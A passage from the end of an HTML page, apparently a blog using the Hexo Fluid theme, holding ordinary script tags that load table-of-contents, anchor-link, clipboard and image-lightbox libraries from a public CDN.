      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
